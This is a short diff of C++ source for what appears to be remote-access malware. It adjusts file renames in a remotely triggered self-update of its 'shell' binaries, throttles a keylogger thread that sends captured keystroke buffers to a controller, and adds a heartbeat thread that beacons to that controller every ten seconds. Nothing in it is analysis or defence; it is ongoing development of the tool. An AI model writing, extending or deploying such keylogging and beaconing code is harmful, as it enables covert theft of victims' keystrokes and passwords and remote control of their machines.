@@ -9,6 +9,7 @@
 #include <libzippp/libzippp.h>
 #include <filesystem>
 
+
 namespace fs = std::filesystem;
 using namespace libzippp;
 
@@ -187,8 +188,8 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 
 		Log("Update init\n");
 		//Temporary rename to trigger update in main routine
-		rename(SHELL_NAME, SHELL_UPDATE_NAME);
-		rename(SHELL_BACKUP_NAME, SHELL_UPDATE_NAME);
+		rename(SHELL_PATH(SHELL_NAME), SHELL_PATH(SHELL_UPDATE_NAME));
+		rename(SHELL_PATH(SHELL_BACKUP_NAME), SHELL_PATH(SHELL_UPDATE_NAME));
 		Log("Renamed old files\n");
 		SendString("Renamed files successfully, update begun\n", PacketType::Warning);
 		break;
@@ -258,6 +259,15 @@ void Client::KeyloggerThread() {
 			clientptr->SendString(logger.GetBuffer(), PacketType::Keylog);
 			logger.ClearBuffer();
 		}
+		Sleep(10000);
+	}
+}
+
+void Client::HearthBeatThread()
+{
+	while (true) {
+		while (!Client::connected) Sleep(100);
+		clientptr->SendString("h", PacketType::Heartbeat);
 		Sleep(10000);
 	}
 }
